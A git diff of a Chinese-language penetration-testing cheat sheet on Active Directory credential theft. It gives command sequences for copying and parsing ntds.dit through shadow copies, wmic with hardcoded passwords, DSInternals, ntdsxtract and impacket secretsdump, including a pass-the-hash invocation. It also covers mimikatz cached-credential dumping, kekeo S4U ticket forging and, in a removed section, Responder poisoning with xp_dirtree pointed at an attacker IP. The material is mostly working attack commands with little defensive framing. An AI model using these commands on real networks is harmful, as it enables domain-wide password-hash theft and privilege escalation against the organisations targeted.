+Install-Module DSInternals
+Import-Module DSInternals
+Get-Bootkey -SystemHivePath 'C:\Users\sanje\Desktop\NTDS\SYSTEM'
+Get-ADDBAccount -All -DBPath 'C:\Users\sanje\Desktop\NTDS\ntds.dit' -Bootkey $key
+```
+
+**Ntdsxtract**
+
+- 工具地址 : [libyal/libesedb](https://github.com/libyal/libesedb/)
+- 相关文章 : [Extracting Hashes and Domain Info From ntds.dit](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)
+
+首先我们需要从 NTDS.dit 文件中提取表格，这里我们可以通过 libesedb-tools 中的 esedbexport 来帮我们完成。Libesedb 是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE 数据库格式被应用于许多不同的应用程序上，如 Windows Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。
+
+安装
+```bash
+get https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz
+tar xf libesedb-experimental-20200418.tar.gz
+cd libesedb-20200418
+apt-get install -y autoconf automake autopoint libtool pkg-config
+./configure
+make
+make install
+ldconfig
+```
+
+利用该工具从 ntds.dit 文件中转储表格
+```bash
+esedbexport -m tables /root/Desktop/NTDS/ntds.dit
+```
+
+下载 ntdsxtract 提取用户信息和密码哈希值
+```bash
+git clone https://github.com/csababarta/ntdsxtract.git
+cd ntdsxtract
+python setup.py build && python setup.py install
+
+dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 data --syshive /root/Desktop/NTDS/SYSTEM --passwordhashes --pwdformat john --ntoutfile nthash.txt --lmoutfile lmhash.txt
+```
+
+#### Dcsync
 
 **mimikatz**
 
 mimikatz 的 DCSync 攻击 NTDS.DIT 操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ntdsdit)
 
-#### 使用VSS卷影副本提取ntds.dit
+#### 卷影复制
 
 卷影副本，也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。
 
 **WMIC**
 ```
 wmic /node:AD /user:PENTESTAdministrator /password:123qweQWE!@# process call create "cmd /c vssadmin create shadow /for=c: 2>&1 > c:vss.log"
-
 wmic /node:AD /user:PENTESTadministrator /password:123qwe!@#!@# process call create "cmd /c copy 卷影IDWindowsNTDSNTDS.dit C:windowstempNTDS.dit 2>&1"
-
 wmic /node:AD /user:PENTESTadministrator /password:123qwe!@# process call create "cmd /c copy 卷影IDWindowsSystem32configSYSTEM c:windowstempSYSTEM.hive 2>&1"
 
 net use k: \pentest.comc$
@@ -877,71 +1194,16 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Sh
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
 ```
 
-#### NTDS转储
+---
 
-**Impacket**
+### mscash
 
-- 工具地址 : [impacket](https://github.com/SecureAuthCorp/impacket)
+Mscash 是微软的一种散列算法，用于在登录成功后将缓存的域凭证存储在系统本地。缓存的凭证不会过期。域凭证被缓存在本地系统上，这样即使DC宕机，域成员也可以登录机器。值得注意的是，mscash hash 是不可 PTH 的
 
-Impacket 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。impacket-secretsdump 模块需要我们提供 SYSTEM 和 NTDS 数据库文件。
-
-```bash
-./secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
-
-# system：表示系统 hive 文件的路径（SYSTEM）
-# ntds：表示 dit 文件的路径（ntds.dit）
-```
-
-此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证从 NTDS.DIT 文件远程转储域密码哈希。
-```bash
-./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
-```
-
-**DSInternals PowerShell**
-
-- 工具地址 : [MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
-
-DSInternals PowerShell 模块提供了构建在框架之上的易于使用的 cmdlet。主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。
-```powershell
-Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules
-Install-Module DSInternals
-Import-Module DSInternals
-Get-Bootkey -SystemHivePath 'C:\Users\sanje\Desktop\NTDS\SYSTEM'
-Get-ADDBAccount -All -DBPath 'C:\Users\sanje\Desktop\NTDS\ntds.dit' -Bootkey $key
-```
-
-**Ntdsxtract**
-
-- 工具地址 : [libyal/libesedb](https://github.com/libyal/libesedb/)
-- 相关文章 : [Extracting Hashes and Domain Info From ntds.dit](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)
-
-首先我们需要从 NTDS.dit 文件中提取表格，这里我们可以通过 libesedb-tools 中的 esedbexport 来帮我们完成。Libesedb 是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE 数据库格式被应用于许多不同的应用程序上，如 Windows Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。
-
-安装
-```bash
-get https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz
-tar xf libesedb-experimental-20200418.tar.gz
-cd libesedb-20200418
-apt-get install -y autoconf automake autopoint libtool pkg-config
-./configure
-make
-make install
-ldconfig
-```
-
-利用该工具从 ntds.dit 文件中转储表格
-```bash
-esedbexport -m tables /root/Desktop/NTDS/ntds.dit
-```
-
-下载 ntdsxtract 提取用户信息和密码哈希值
-```bash
-git clone https://github.com/csababarta/ntdsxtract.git
-cd ntdsxtract
-python setup.py build && python setup.py install
-
-dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 data --syshive /root/Desktop/NTDS/SYSTEM --passwordhashes --pwdformat john --ntoutfile nthash.txt --lmoutfile lmhash.txt
-```
+- mimikatz
+    ```bash
+    lsadump::cache  # 获取 SysKey 用于解密 NLKM 和 MSCache(v2)
+    ```
 
 ---
 
@@ -1377,30 +1639,5 @@ kekeo.exe "tgt::ask /user:sqlsvr /domain:ffffffff0x.com /password:Admin12345" ex
 
 kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@ffffffff0x.com_krbtgt~ffffffff0x.com@ffffffff0x.com.kirbi /user:administrator@ffffffff0x.com /service:/service:service_to_access" exit
 
-
 Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
 ```
-
----
-
-## 毒化LLMNR和NBT-NS请求
-
-**相关文章**
-- [Windows环境中使用Responder获取NTLMv2哈希并利用](https://www.freebuf.com/articles/system/194549.html)
-- [攻防最前线：一封邮件就能捕获你的口令散列值](https://www.secrss.com/articles/8143)
-- [Steal_NTLMv2_hash_using_File_Download_vulnerability](https://github.com/incredibleindishell/Windows-AD-environment-related/blob/master/Steal_NTLMv2_hash_using_File_Download_vulnerability/README.md) - 任意文件下载漏洞配合 Responder 毒化
-
-**工具**
-- [SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
-    ```
-    python Responder.py -I eth0
-    ```
-    在 Windows 机器上 ：打开文件浏览器，连接 file:////<linuxIPaddress>/test.htlm (或者任意文件名)；
-    ```
-    cd /usr/share/responder/logs
-    ```
-
-    或者配合 mssql
-    ```
-    xp_dirtree "\\<linuxIPaddress>\aaa.com"
-    ```
